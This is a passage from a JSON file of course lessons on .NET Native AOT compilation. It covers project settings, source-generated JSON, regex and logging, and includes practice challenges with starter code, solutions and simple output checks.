              "code": "// ===== COMPARING JIT vs NATIVE AOT =====\n\n// TRADITIONAL .NET (JIT)\n// dotnet run\n// 1. Load .NET runtime\n// 2. Load IL assemblies\n// 3. JIT compile methods on first call\n// 4. Execute\n// Startup: ~100-500ms for simple apps\n\n// NATIVE AOT\n// dotnet publish -c Release\n// 1. Load native executable\n// 2. Execute\n// Startup: ~10-50ms for simple apps!\n\n// ===== ENABLING NATIVE AOT =====\n// In your .csproj file:\n\n// <Project Sdk=\"Microsoft.NET.Sdk\">\n//   <PropertyGroup>\n//     <OutputType>Exe</OutputType>\n//     <TargetFramework>net9.0</TargetFramework>\n//     \n//     <!-- Enable Native AOT -->\n//     <PublishAot>true</PublishAot>\n//     \n//     <!-- Optional: Further reduce size -->\n//     <InvariantGlobalization>true</InvariantGlobalization>\n//     <OptimizationPreference>Size</OptimizationPreference>\n//   </PropertyGroup>\n// </Project>\n\n// ===== SIMPLE AOT EXAMPLE =====\nusing System.Text.Json;\n\nConsole.WriteLine(\"Native AOT Demo!\");\nConsole.WriteLine($\"Process ID: {Environment.ProcessId}\");\nConsole.WriteLine($\"64-bit: {Environment.Is64BitProcess}\");\n\n// This works great in AOT!\nvar numbers = new[] { 1, 2, 3, 4, 5 };\nvar sum = numbers.Sum();\nConsole.WriteLine($\"Sum: {sum}\");\n\n// Simple JSON (but needs source generators for AOT!)\nvar person = new Person(\"Alice\", 30);\nConsole.WriteLine($\"Person: {person.Name}, Age {person.Age}\");\n\npublic record Person(string Name, int Age);\n\n// ===== PUBLISH COMMANDS =====\n\n// Development (JIT)\n// dotnet run\n\n// Production AOT (single file!)\n// dotnet publish -c Release -r win-x64\n// dotnet publish -c Release -r linux-x64\n// dotnet publish -c Release -r osx-arm64\n\n// ===== OUTPUT COMPARISON =====\n// JIT publish:    ~80 MB (with runtime)\n// AOT publish:    ~10-15 MB (self-contained)\n// AOT trimmed:    ~3-8 MB (minimal)\n\n// ===== MEMORY COMPARISON =====\n// JIT startup:    ~50-100 MB working set\n// AOT startup:    ~10-20 MB working set\n\nConsole.WriteLine(\"\\nNative AOT Benefits:\");\nConsole.WriteLine(\"- Instant startup (no JIT warmup)\");\nConsole.WriteLine(\"- Smaller memory footprint\");\nConsole.WriteLine(\"- Single file deployment\");\nConsole.WriteLine(\"- No .NET runtime required on target\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`<PublishAot>true</PublishAot>`**: The magic switch! Tells the .NET SDK to compile to native code instead of IL. Only affects 'dotnet publish', not 'dotnet run'.\n\n**`<InvariantGlobalization>true</InvariantGlobalization>`**: Disables culture-specific formatting (dates, numbers). Reduces binary size significantly. Use when you don't need localization.\n\n**`<OptimizationPreference>Size</OptimizationPreference>`**: Optimize for smaller binary size instead of speed. Options: Speed (default), Size, or blank for balanced. Note: Previously called IlcOptimizationPreference in earlier .NET versions.\n\n**`-r win-x64 / linux-x64 / osx-arm64`**: Runtime Identifier (RID). AOT produces platform-specific binaries. You must specify the target platform.\n\n**Single File Output**: AOT produces ONE executable file. No DLLs, no runtime folder. Just copy and run!\n\n**Startup Time**: AOT apps start in milliseconds because there's no JIT compilation. Perfect for CLI tools, serverless functions, microservices."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Critical AOT Limitations\n\n**Reflection Limitations**: Native AOT has significant reflection restrictions. Code using `typeof(T).GetProperties()`, `Activator.CreateInstance()`, or dynamic type loading may fail at runtime. Use source generators or compile-time alternatives instead.\n\n**No Runtime Code Generation**: The `dynamic` keyword, `Reflection.Emit`, and runtime expression compilation are NOT supported in AOT. These require JIT which doesn't exist in native binaries.\n\n**Platform-Specific Binaries**: Unlike .NET's 'build once, run anywhere' model, AOT produces separate binaries for each target platform. You must build and deploy for each OS/architecture combination.\n\n**.NET 9 Memory Improvements**: Native AOT apps in .NET 9 use 30-40% less memory than previous versions. However, initial binary sizes may still be larger than JIT deployments - typically 10-15 MB minimum.\n\n**Testing is Essential**: Always test your AOT builds thoroughly! Code that works perfectly with JIT may fail in AOT due to trimming or reflection issues. Enable `<EnableAotAnalyzer>true</EnableAotAnalyzer>` to catch issues early."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-17-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple console application that demonstrates AOT compatibility!\n\n1. Create a record called 'AppInfo' with properties:\n   - Name (string)\n   - Version (string)\n   - StartTime (DateTime)\n\n2. In your main code:\n   - Create an AppInfo instance with your app's details\n   - Print the app name and version\n   - Calculate and print how long since the app started (use Stopwatch)\n   - Print whether the process is 64-bit\n   - Print the working set memory in MB\n\n3. Add comments indicating which parts are AOT-compatible\n\nFocus on AOT-safe patterns (no reflection, no dynamic code generation).",
              "starterCode": "using System.Diagnostics;\n\n// TODO: Define AppInfo record with Name, Version, StartTime\n\n// Track startup time\nvar stopwatch = Stopwatch.StartNew();\n\nConsole.WriteLine(\"=== Native AOT Demo ===\");\n\n// TODO: Create AppInfo instance\n\n// TODO: Print app name and version\n\n// Simulate some work\nThread.Sleep(100);\n\n// TODO: Stop the stopwatch and print elapsed time\n\n// TODO: Print if process is 64-bit (Environment.Is64BitProcess)\n\n// TODO: Print working set memory in MB\n// Hint: Environment.WorkingSet / (1024 * 1024)\n\nConsole.WriteLine(\"\\nAll operations are AOT-compatible!\");",
              "solution": "using System.Diagnostics;\n\n// Record types are fully AOT-compatible!\npublic record AppInfo(string Name, string Version, DateTime StartTime);\n\n// Track startup time - Stopwatch is AOT-safe\nvar stopwatch = Stopwatch.StartNew();\n\nConsole.WriteLine(\"=== Native AOT Demo ===\");\n\n// Create instance - no reflection needed!\nvar appInfo = new AppInfo(\n    Name: \"AOT Demo App\",\n    Version: \"1.0.0\",\n    StartTime: DateTime.Now\n);\n\n// String interpolation is AOT-compatible\nConsole.WriteLine($\"App: {appInfo.Name}\");\nConsole.WriteLine($\"Version: {appInfo.Version}\");\nConsole.WriteLine($\"Started: {appInfo.StartTime:HH:mm:ss}\");\n\n// Simulate some work\nThread.Sleep(100);\n\n// Stop and report elapsed time\nstopwatch.Stop();\nConsole.WriteLine($\"\\nElapsed: {stopwatch.ElapsedMilliseconds}ms\");\n\n// Environment properties are AOT-safe\nConsole.WriteLine($\"64-bit process: {Environment.Is64BitProcess}\");\n\n// Memory info - no reflection required\nvar memoryMB = Environment.WorkingSet / (1024.0 * 1024.0);\nConsole.WriteLine($\"Working set: {memoryMB:F2} MB\");\n\n// Process info is AOT-compatible\nConsole.WriteLine($\"Process ID: {Environment.ProcessId}\");\n\nConsole.WriteLine(\"\\nAll operations are AOT-compatible!\");\nConsole.WriteLine(\"Publish with: dotnet publish -c Release -r win-x64\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should show app info",
                  "expectedOutput": "App:",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should confirm AOT compatibility",
                  "expectedOutput": "AOT-compatible",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Record types: public record AppInfo(string Name, string Version, DateTime StartTime); - single line definition!"
                },
                {
                  "level": 2,
                  "text": "Stopwatch: var sw = Stopwatch.StartNew(); then sw.Stop(); then sw.ElapsedMilliseconds"
                },
                {
                  "level": 3,
                  "text": "Environment.Is64BitProcess returns bool. Environment.WorkingSet returns long (bytes)."
                },
                {
                  "level": 4,
                  "text": "Format memory: (Environment.WorkingSet / (1024.0 * 1024.0)).ToString(\"F2\") for 2 decimal places."
                },
                {
                  "level": 5,
                  "text": "String interpolation with format: $\"{value:F2}\" formats as fixed-point with 2 decimals."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using reflection for property access",
                  "consequence": "typeof(T).GetProperties() may not work in AOT! Reflection is limited without special annotations.",
                  "correction": "Access properties directly: appInfo.Name, not reflection. AOT needs to know types at compile time."
                },
                {
                  "mistake": "Using dynamic keyword",
                  "consequence": "dynamic requires runtime compilation which doesn't exist in AOT. Will throw at runtime!",
                  "correction": "Use strong typing. Replace 'dynamic' with concrete types or generics."
                },
                {
                  "mistake": "Forgetting to specify runtime identifier",
                  "consequence": "dotnet publish without -r fails for AOT! Native code is platform-specific.",
                  "correction": "Always specify: -r win-x64, -r linux-x64, -r osx-arm64, etc."
                },
                {
                  "mistake": "Integer division for memory calculation",
                  "consequence": "WorkingSet / (1024 * 1024) uses integer division, losing precision!",
                  "correction": "Use 1024.0 * 1024.0 to force floating-point division for accurate MB values."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-17-02",
          "title": "Enabling AOT in Your Projects",
          "moduleId": "module-17",
          "order": 2,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Think of Native AOT configuration like preparing for a camping trip where you'll have NO stores nearby:\n\nREGULAR .NET (City Living):\n- Need something? Just go to the store (JIT compiles on demand)\n- Bring a credit card (the .NET runtime)\n- Flexible but dependent on infrastructure\n\nNATIVE AOT (Remote Camping):\n- Pack EVERYTHING you need beforehand\n- No stores, no help available\n- Must decide what to bring (trim unused code)\n- Lighter pack = easier travel (smaller binary)\n\nPROJECT FILE SETTINGS:\n\n<PublishAot>true</PublishAot>\n- 'We're going camping!'\n- Enables AOT compilation on publish\n\n<TrimMode>full</TrimMode>\n- 'Only pack what we'll actually use'\n- Removes unused code aggressively\n\n<InvariantGlobalization>true</InvariantGlobalization>\n- 'We don't need the phrase book'\n- Removes localization data\n\n<OptimizationPreference>Size</OptimizationPreference>\n- 'Smallest backpack possible'\n- Optimize for binary size over speed\n\nWARNINGS AND ANALYSIS:\n- AOT analyzer warns about incompatible patterns\n- Like a packing checklist saying 'You forgot a tent!'\n- Fix warnings BEFORE deployment\n\nThink: 'AOT configuration is your packing list - include only what you need, and verify everything fits!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== COMPLETE AOT PROJECT FILE =====\n// MyApp.csproj\n\n// <Project Sdk=\"Microsoft.NET.Sdk\">\n//   <PropertyGroup>\n//     <OutputType>Exe</OutputType>\n//     <TargetFramework>net9.0</TargetFramework>\n//     <Nullable>enable</Nullable>\n//     <ImplicitUsings>enable</ImplicitUsings>\n//     \n//     <!-- NATIVE AOT SETTINGS -->\n//     <PublishAot>true</PublishAot>\n//     \n//     <!-- TRIMMING (removes unused code) -->\n//     <TrimMode>full</TrimMode>\n//     <IsTrimmable>true</IsTrimmable>\n//     \n//     <!-- SIZE OPTIMIZATION -->\n//     <InvariantGlobalization>true</InvariantGlobalization>\n//     <OptimizationPreference>Size</OptimizationPreference>\n//     \n//     <!-- SINGLE FILE OUTPUT -->\n//     <PublishSingleFile>true</PublishSingleFile>\n//     <SelfContained>true</SelfContained>\n//     \n//     <!-- AOT WARNINGS AS ERRORS (recommended!) -->\n//     <TreatWarningsAsErrors>true</TreatWarningsAsErrors>\n//     <EnableTrimAnalyzer>true</EnableTrimAnalyzer>\n//     <EnableAotAnalyzer>true</EnableAotAnalyzer>\n//   </PropertyGroup>\n// </Project>\n\n// ===== AOT-COMPATIBLE CODE =====\nusing System.Text.Json;\nusing System.Text.Json.Serialization;\n\n// Source generator for JSON (AOT-compatible!)\n[JsonSerializable(typeof(Config))]\n[JsonSerializable(typeof(List<string>))]\ninternal partial class AppJsonContext : JsonSerializerContext { }\n\npublic class Config\n{\n    public string AppName { get; set; } = \"\";\n    public int MaxConnections { get; set; }\n    public List<string> AllowedHosts { get; set; } = new();\n}\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"AOT-Enabled Application\");\n        \n        // Create configuration\n        var config = new Config\n        {\n            AppName = \"My AOT App\",\n            MaxConnections = 100,\n            AllowedHosts = new List<string> { \"localhost\", \"api.example.com\" }\n        };\n        \n        // AOT-compatible JSON serialization (using source generator!)\n        var json = JsonSerializer.Serialize(config, AppJsonContext.Default.Config);\n        Console.WriteLine($\"Serialized: {json}\");\n        \n        // Deserialize back\n        var loaded = JsonSerializer.Deserialize(json, AppJsonContext.Default.Config);\n        Console.WriteLine($\"Loaded: {loaded?.AppName}\");\n        \n        // LINQ works in AOT!\n        var hosts = config.AllowedHosts.Where(h => h.Contains(\".\")).ToList();\n        Console.WriteLine($\"Filtered hosts: {string.Join(\", \", hosts)}\");\n        \n        // Collections work fine\n        var numbers = Enumerable.Range(1, 10).Select(n => n * 2).ToArray();\n        Console.WriteLine($\"Doubled: {string.Join(\", \", numbers)}\");\n    }\n}\n\n// ===== PUBLISH COMMANDS =====\n// Windows:\n//   dotnet publish -c Release -r win-x64\n//\n// Linux:\n//   dotnet publish -c Release -r linux-x64\n//\n// macOS (Apple Silicon):\n//   dotnet publish -c Release -r osx-arm64\n//\n// Output: bin/Release/net9.0/[rid]/publish/MyApp.exe\n\n// ===== VERIFY AOT OUTPUT =====\n// - Single executable file\n// - No .dll files\n// - No runtimeconfig.json needed\n// - Just copy and run!\n\nConsole.WriteLine(\"\\nPublish with: dotnet publish -c Release -r win-x64\");\nConsole.WriteLine(\"Output will be a single native executable!\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`<PublishAot>true</PublishAot>`**: Master switch for AOT. Only affects 'dotnet publish'. Development with 'dotnet run' still uses JIT for fast iteration.\n\n**`<TrimMode>full</TrimMode>`**: Aggressive tree-shaking. Removes ALL code not provably used. Some reflection patterns may break - test thoroughly!\n\n**`<EnableTrimAnalyzer>true</EnableTrimAnalyzer>`**: Static analysis for trim compatibility. Warns about patterns that might break. Fix these warnings!\n\n**`<EnableAotAnalyzer>true</EnableAotAnalyzer>`**: Warns about AOT-incompatible patterns. Catches issues at compile time, not runtime.\n\n**`[JsonSerializable(typeof(T))]`**: Source generator attribute. Tells JSON serializer to generate code for type T at compile time instead of using reflection.\n\n**`JsonSerializerContext`**: Base class for source-generated JSON. AppJsonContext.Default.Config provides pre-generated serialization logic.\n\n**`-r win-x64 / linux-x64`**: Runtime Identifier. Required for AOT because native code is platform-specific. Cross-compilation is supported!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## AOT Configuration Gotchas\n\n**TrimMode Dangers**: Using `TrimMode=full` can remove code that appears unused but is accessed via reflection. If your app crashes in AOT but works in JIT, trimming is often the culprit. Use `[DynamicallyAccessedMembers]` attributes to preserve reflection targets.\n\n**InvariantGlobalization Side Effects**: When enabled, `CultureInfo.CurrentCulture` throws for non-invariant cultures. Date/number formatting becomes culture-agnostic. This breaks apps requiring localization - only use for single-culture deployments.\n\n**Analyzer Warnings Are Critical**: Never ignore AOT or trim analyzer warnings! They indicate code that WILL fail in production. Treat `<TreatWarningsAsErrors>true</TreatWarningsAsErrors>` as mandatory for AOT projects.\n\n**Build Time Increases**: AOT compilation is significantly slower than JIT builds. Expect 2-10x longer build times. Use JIT for development (`dotnet run`) and only publish with AOT for releases.\n\n**Third-Party Library Compatibility**: Many NuGet packages use reflection internally. Check package documentation for AOT compatibility or look for [RequiresUnreferencedCode] warnings during build."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-17-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an AOT-ready configuration system!\n\n1. Create a 'ServerSettings' class with:\n   - Port (int)\n   - Host (string)\n   - EnableSsl (bool)\n   - AllowedOrigins (List<string>)\n\n2. Create a JsonSerializerContext with [JsonSerializable] for:\n   - ServerSettings\n   - List<ServerSettings>\n\n3. Write code that:\n   - Creates a ServerSettings instance with sample values\n   - Serializes it to JSON using the source-generated context\n   - Prints the JSON (indented)\n   - Deserializes it back and verifies the values\n\n4. Print the .csproj settings needed for AOT\n\nUse JsonSerializer with the source-generated context!",
              "starterCode": "using System.Text.Json;\nusing System.Text.Json.Serialization;\n\n// TODO: Create ServerSettings class with:\n// - Port (int)\n// - Host (string)\n// - EnableSsl (bool)\n// - AllowedOrigins (List<string>)\n\n// TODO: Create JsonSerializerContext with [JsonSerializable] attributes\n// Hint: [JsonSerializable(typeof(ServerSettings))]\n//       internal partial class SettingsJsonContext : JsonSerializerContext { }\n\n// Main code\nConsole.WriteLine(\"=== AOT-Ready Configuration System ===\");\n\n// TODO: Create sample ServerSettings\n\n// TODO: Serialize to JSON using source-generated context\n// Hint: JsonSerializer.Serialize(settings, SettingsJsonContext.Default.ServerSettings)\n\n// TODO: Print JSON (use JsonSerializerOptions for indentation)\n\n// TODO: Deserialize and verify\n\n// Print .csproj settings\nConsole.WriteLine(\"\\n=== Required .csproj Settings ===\");\nConsole.WriteLine(\"<PublishAot>true</PublishAot>\");",
              "solution": "using System.Text.Json;\nusing System.Text.Json.Serialization;\n\n// AOT-compatible configuration class\npublic class ServerSettings\n{\n    public int Port { get; set; }\n    public string Host { get; set; } = \"\";\n    public bool EnableSsl { get; set; }\n    public List<string> AllowedOrigins { get; set; } = new();\n}\n\n// Source-generated JSON context for AOT compatibility\n[JsonSerializable(typeof(ServerSettings))]\n[JsonSerializable(typeof(List<ServerSettings>))]\n[JsonSourceGenerationOptions(WriteIndented = true)]\ninternal partial class SettingsJsonContext : JsonSerializerContext { }\n\n// Main code\nConsole.WriteLine(\"=== AOT-Ready Configuration System ===\");\n\n// Create sample settings\nvar settings = new ServerSettings\n{\n    Port = 8080,\n    Host = \"api.example.com\",\n    EnableSsl = true,\n    AllowedOrigins = new List<string>\n    {\n        \"https://app.example.com\",\n        \"https://admin.example.com\"\n    }\n};\n\nConsole.WriteLine(\"\\nOriginal settings:\");\nConsole.WriteLine($\"  Host: {settings.Host}:{settings.Port}\");\nConsole.WriteLine($\"  SSL: {settings.EnableSsl}\");\nConsole.WriteLine($\"  Origins: {settings.AllowedOrigins.Count}\");\n\n// Serialize using source-generated context (AOT-safe!)\nvar json = JsonSerializer.Serialize(settings, SettingsJsonContext.Default.ServerSettings);\n\nConsole.WriteLine(\"\\nSerialized JSON:\");\nConsole.WriteLine(json);\n\n// Deserialize back\nvar loaded = JsonSerializer.Deserialize(json, SettingsJsonContext.Default.ServerSettings);\n\nConsole.WriteLine(\"\\nDeserialized and verified:\");\nConsole.WriteLine($\"  Port matches: {loaded?.Port == settings.Port}\");\nConsole.WriteLine($\"  Host matches: {loaded?.Host == settings.Host}\");\nConsole.WriteLine($\"  SSL matches: {loaded?.EnableSsl == settings.EnableSsl}\");\n\n// Print .csproj settings\nConsole.WriteLine(\"\\n=== Required .csproj Settings ===\");\nConsole.WriteLine(\"<PublishAot>true</PublishAot>\");\nConsole.WriteLine(\"<TrimMode>full</TrimMode>\");\nConsole.WriteLine(\"<InvariantGlobalization>true</InvariantGlobalization>\");\nConsole.WriteLine(\"<EnableAotAnalyzer>true</EnableAotAnalyzer>\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should show serialized JSON",
                  "expectedOutput": "JSON",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should show AOT settings",
                  "expectedOutput": "PublishAot",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "[JsonSerializable(typeof(ServerSettings))] tells source generator to create code for ServerSettings."
                },
                {
                  "level": 2,
                  "text": "JsonSerializerContext is abstract - use 'partial class' and the generator fills in the implementation."
                },
                {
                  "level": 3,
                  "text": "[JsonSourceGenerationOptions(WriteIndented = true)] on the context class enables pretty-printing."
                },
                {
                  "level": 4,
                  "text": "Access pre-generated serializer: SettingsJsonContext.Default.ServerSettings (not typeof!)."
                },
                {
                  "level": 5,
                  "text": "Multiple [JsonSerializable] attributes can stack on one context class for multiple types."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using JsonSerializer.Serialize<T>() without context",
                  "consequence": "JsonSerializer.Serialize(obj) uses reflection internally - not AOT compatible!",
                  "correction": "Always pass the context: JsonSerializer.Serialize(obj, Context.Default.TypeName)"
                },
                {
                  "mistake": "Forgetting 'partial' on the context class",
                  "consequence": "Source generator can't add the implementation. You get compile errors!",
                  "correction": "internal partial class MyJsonContext : JsonSerializerContext { } - 'partial' is required!"
                },
                {
                  "mistake": "Not including all needed types in [JsonSerializable]",
                  "consequence": "Nested types or collections fail at runtime if not registered!",
                  "correction": "Add [JsonSerializable(typeof(List<T>))] for any generic collections you use."
                },
                {
                  "mistake": "Using object or dynamic in serialized types",
                  "consequence": "Source generator can't know the actual type. Serialization fails or produces wrong output.",
                  "correction": "Use concrete types. Replace 'object Data' with 'Dictionary<string, string> Data' or similar."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-17-03",
          "title": "Source Generators for AOT",
          "moduleId": "module-17",
          "order": 3,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you run a custom t-shirt printing shop. You have TWO business models:\n\nON-DEMAND PRINTING (Reflection at Runtime):\n- Customer orders a shirt\n- You design it on the spot\n- Print it while they wait\n- Flexible but slow\n- Requires full printing equipment everywhere\n\nPRE-PRINTED CATALOG (Source Generators):\n- Before opening, design ALL possible shirts\n- Print them in advance\n- Customer picks from ready stock\n- Instant delivery, no equipment needed at stores\n\nSOURCE GENERATORS:\n- Run during compilation (not runtime)\n- Generate C# code that gets compiled with your app\n- No reflection needed at runtime\n- Perfect for AOT because all code exists at compile time\n\nBUILT-IN SOURCE GENERATORS:\n\n1. JSON Source Generator:\n   - [JsonSerializable(typeof(T))]\n   - Generates serialization code for your types\n   - No reflection for JSON parsing!\n\n2. Regex Source Generator:\n   - [GeneratedRegex(pattern)]\n   - Compiles regex at build time\n   - Faster than runtime compilation\n\n3. Logging Source Generator:\n   - [LoggerMessage(...)]\n   - Generates high-performance logging\n   - Zero allocations for log messages\n\nWHY SOURCE GENERATORS MATTER FOR AOT:\n- AOT can't generate code at runtime\n- Source generators move that work to compile time\n- Result: All code exists in the final binary\n\nThink: 'Source generators are like pre-cooking meals - all the work happens in the kitchen, so serving is instant!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System.Text.Json;\nusing System.Text.Json.Serialization;\nusing System.Text.RegularExpressions;\nusing Microsoft.Extensions.Logging;\n\n// ===== JSON SOURCE GENERATOR =====\n// Generates serialization code at compile time\n\npublic record Product(int Id, string Name, decimal Price, string[] Tags);\npublic record Order(int OrderId, List<Product> Items, DateTime Created);\n\n[JsonSerializable(typeof(Product))]\n[JsonSerializable(typeof(Order))]\n[JsonSerializable(typeof(List<Product>))]\n[JsonSourceGenerationOptions(\n    WriteIndented = true,\n    PropertyNamingPolicy = JsonKnownNamingPolicy.CamelCase)]\ninternal partial class AppJsonContext : JsonSerializerContext { }\n\n// Usage - NO reflection at runtime!\nvar product = new Product(1, \"Widget\", 29.99m, new[] { \"tools\", \"gadgets\" });\nvar json = JsonSerializer.Serialize(product, AppJsonContext.Default.Product);\nConsole.WriteLine($\"JSON: {json}\");\n\nvar parsed = JsonSerializer.Deserialize(json, AppJsonContext.Default.Product);\nConsole.WriteLine($\"Parsed: {parsed?.Name}\");\n\n// ===== REGEX SOURCE GENERATOR =====\n// Compiles regex at build time for better performance\n\npublic partial class Validators\n{\n    // Email validation - compiled at build time!\n    [GeneratedRegex(@\"^[\\w.-]+@[\\w.-]+\\.\\w+$\", RegexOptions.IgnoreCase)]\n    public static partial Regex EmailRegex();\n    \n    // Phone number - US format\n    [GeneratedRegex(@\"^\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}$\")]\n    public static partial Regex PhoneRegex();\n    \n    // URL validation\n    [GeneratedRegex(@\"^https?://[\\w.-]+(/[\\w./]*)?$\", RegexOptions.IgnoreCase)]\n    public static partial Regex UrlRegex();\n}\n\n// Usage - instant, no runtime compilation\nConsole.WriteLine($\"\\nEmail valid: {Validators.EmailRegex().IsMatch(\"test@example.com\")}\");\nConsole.WriteLine($\"Phone valid: {Validators.PhoneRegex().IsMatch(\"(555) 123-4567\")}\");\nConsole.WriteLine($\"URL valid: {Validators.UrlRegex().IsMatch(\"https://example.com/path\")}\");\n\n// ===== LOGGING SOURCE GENERATOR =====\n// High-performance, zero-allocation logging\n\npublic static partial class LogMessages\n{\n    [LoggerMessage(\n        Level = LogLevel.Information,\n        Message = \"Processing order {OrderId} with {ItemCount} items\")]\n    public static partial void LogOrderProcessing(\n        ILogger logger, int orderId, int itemCount);\n    \n    [LoggerMessage(\n        Level = LogLevel.Warning,\n        Message = \"Order {OrderId} total {Total:C} exceeds limit\")]\n    public static partial void LogOrderLimitExceeded(\n        ILogger logger, int orderId, decimal total);\n    \n    [LoggerMessage(\n        Level = LogLevel.Error,\n        Message = \"Failed to process order {OrderId}\")]\n    public static partial void LogOrderFailed(\n        ILogger logger, int orderId, Exception ex);\n}\n\n// Usage with ILogger\n// LogMessages.LogOrderProcessing(logger, 12345, 5);\n// LogMessages.LogOrderLimitExceeded(logger, 12345, 10000m);\n// LogMessages.LogOrderFailed(logger, 12345, exception);\n\nConsole.WriteLine(\"\\nSource generators active:\");\nConsole.WriteLine(\"- JSON: Serialization without reflection\");\nConsole.WriteLine(\"- Regex: Patterns compiled at build time\");\nConsole.WriteLine(\"- Logging: Zero-allocation log messages\");\nConsole.WriteLine(\"\\nAll code generated at compile time = AOT ready!\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`[JsonSerializable(typeof(T))]`**: Register type T for source generation. The generator creates Serialize/Deserialize methods specifically for T. No reflection!\n\n**`[JsonSourceGenerationOptions(...)]`**: Configure all generated serializers. WriteIndented, PropertyNamingPolicy, etc. apply to all types in this context.\n\n**`[GeneratedRegex(pattern)]`**: Marks a partial method to receive generated regex. The generator compiles the pattern at build time into optimized IL.\n\n**`public static partial Regex MethodName()`**: The signature for generated regex. Must be static, partial, return Regex, take no parameters. Generator fills in the body.\n\n**`[LoggerMessage(Level, Message)]`**: Generates high-performance logging method. Message uses {placeholders} that map to method parameters.\n\n**`public static partial void LogXxx(ILogger, params...)`**: Logger is first param. Additional params match {placeholders} in order. Generator creates the implementation.\n\n**Why partial?**: Source generators ADD code to partial classes/methods. You declare the signature, generator provides implementation."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Source Generator Gotchas\n\n**Must Be Partial**: Forgetting the `partial` keyword is the #1 mistake. Without it, the source generator cannot add its implementation and you get cryptic compiler errors.\n\n**Nested Types Not Automatically Included**: If your class has nested types or collections, you must explicitly register each one with `[JsonSerializable(typeof(List<MyType>))]`. Missing registrations cause runtime failures in AOT.\n\n**Regex Complexity Limits**: Extremely complex regex patterns may cause source generator build failures or generate slow code. Keep patterns reasonably simple or break them into multiple smaller patterns.\n\n**IDE Support Varies**: Some IDEs may not show generated code in IntelliSense immediately. Rebuild the project if auto-complete for generated methods doesn't appear.\n\n**Source Generator Ordering**: When using multiple source generators, order can matter. If one generator's output is input to another, you may need explicit build dependencies.\n\n**LoggerMessage Performance**: While [LoggerMessage] is faster than string interpolation, the performance gain is only significant at high log volumes. Don't over-optimize simple applications."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-17-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a validation library using source-generated regex!\n\n1. Create a partial class 'InputValidators' with generated regex methods:\n   - CreditCard: 16 digits (with optional dashes/spaces every 4)\n   - PostalCode: 5 digits or 5+4 format (12345 or 12345-6789)\n   - Username: 3-20 alphanumeric characters, underscores allowed\n   - StrongPassword: At least 8 chars, must have upper, lower, digit, special\n\n2. Create a Validate() method that tests each pattern\n\n3. Test with sample valid and invalid inputs\n\n4. Print results showing which validations pass/fail\n\nUse [GeneratedRegex] attribute for AOT compatibility!",
              "starterCode": "using System.Text.RegularExpressions;\n\n// TODO: Create partial class InputValidators with generated regex methods\n// Patterns needed:\n// - CreditCard: 16 digits, optional separators (1234-5678-9012-3456)\n// - PostalCode: 5 digits or 5+4 (12345 or 12345-6789)\n// - Username: 3-20 chars, alphanumeric + underscore\n// - StrongPassword: 8+ chars, upper, lower, digit, special\n\npublic partial class InputValidators\n{\n    // TODO: [GeneratedRegex(...)] for CreditCard\n    \n    // TODO: [GeneratedRegex(...)] for PostalCode\n    \n    // TODO: [GeneratedRegex(...)] for Username\n    \n    // TODO: [GeneratedRegex(...)] for StrongPassword\n}\n\n// Test the validators\nConsole.WriteLine(\"=== AOT-Ready Input Validation ===\");\n\n// Test data\nvar testCreditCard = \"1234-5678-9012-3456\";\nvar testPostalCode = \"12345-6789\";\nvar testUsername = \"user_123\";\nvar testPassword = \"Secure@123\";\n\n// TODO: Run validations and print results\n\nConsole.WriteLine(\"\\nAll regex compiled at build time - AOT ready!\");",
